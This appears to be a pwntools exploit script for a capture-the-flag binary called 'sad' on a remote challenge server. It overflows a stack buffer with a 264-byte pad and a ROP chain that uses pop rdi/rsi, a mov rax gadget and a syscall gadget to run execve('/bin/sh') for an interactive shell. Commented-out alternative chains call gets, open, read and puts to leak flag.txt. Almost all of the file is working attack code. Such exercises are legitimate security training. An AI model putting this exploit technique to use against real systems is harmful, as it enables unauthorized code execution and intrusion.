from pwn import *


context.arch = 'amd64'

_FILE = "./sad"

binary = ELF(_FILE, checksec=False)

#p = process(_FILE)
#gdb.attach(p.pid)
p = remote("jh2i.com", 50002)

rop = ROP(binary)

pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
pop_rsi = rop.find_gadget(["pop rsi", "ret"])[0]
pop_rdx = rop.find_gadget(["pop rdx", "ret"])[0]
syscall = 0x00462409    # rop.find_gadget(["syscall", "ret"])[0]
binsh   = next(binary.search(b"/bin/sh"))
mov_rax_qrsp = 0x0047c12e # 2 pops after

#_libc_got = 

flag = b"flag.txt"
r    = b"r" + b"\x00"*7
execve = 59
EOL  = b"\x00"
data = 0x4ae0e0
data_r = data+16


payload = cyclic(264, n=8)

payload += p64(pop_rdi)
payload += p64(binsh)

payload += p64(pop_rsi)
payload += p64(0x0)

payload += p64(mov_rax_qrsp)
payload += p64(execve)
payload += p64(0x0)*((0x38//8)-2)
payload += p64(0x0)*2
payload += p64(binsh)

payload += p64(syscall)

p.recvuntil(";)\n")
p.sendline(payload)


'''
# try read flag.txt (no read function)
payload += p64(pop_rdi)
payload += p64(data)
payload += p64(binary.sym['gets']) # get file.txt

payload += p64(pop_rdi)
payload += p64(data_r)
payload += p64(binary.sym['gets']) # get r


payload += p64(pop_rdi)
payload += p64(data)
payload += p64(pop_rsi)
payload += p64(data_r)
payload += p64(binary.sym['open'])

payload += p64(pop_rsi)
payload += p64(data)
#payload += p64(pop_rdx)
#payload += p64(0xA)

payload += p64(binary.sym['read'])

payload += p64(data)
payload += p64(binary.sym['puts'])
payload += p64(binary.sym['exit'])


p.recvuntil(";)\n")
p.sendline(payload)

p.clean()
p.sendline(flag)

p.clean()
p.sendline(r)

payload = cyclic(264, n=8)
payload += p64(pop_rdi)
payload += p64(0x4ae0e0)
payload += p64(binary.sym['fopen'])
payload += p64(binary.sym['read'])
payload += p64(binary.sym['puts'])
'''
'''
# current directory
payload = cyclic(264, n=8)
payload += p64(binary.sym['getcwd'])

payload += p64(binary.sym['puts'])
'''

p.interactive()

with open("exp", "wb") as f:
    f.write(payload)
    f.close()
